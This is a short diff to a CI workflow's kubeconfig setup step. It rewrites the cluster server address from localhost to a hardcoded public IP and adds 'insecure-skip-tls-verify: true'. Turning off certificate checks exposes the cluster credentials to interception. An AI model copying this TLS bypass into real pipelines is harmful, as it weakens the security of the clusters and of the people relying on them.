@@ -102,7 +102,10 @@ jobs:
       - name: Configure kubeconfig
         run: |
           mkdir -p $HOME/.kube
-          echo "${{ secrets.KUBE_CONFIG }}" | base64 -d > $HOME/.kube/config
+          echo "${{ secrets.KUBE_CONFIG }}" | base64 -d | \
+            sed 's|https://127.0.0.1:6443|https://101.200.181.141:6443|g' | \
+            sed '/^    server:/a\    insecure-skip-tls-verify: true' \
+            > $HOME/.kube/config
           chmod 600 $HOME/.kube/config
 
       - name: Verify cluster
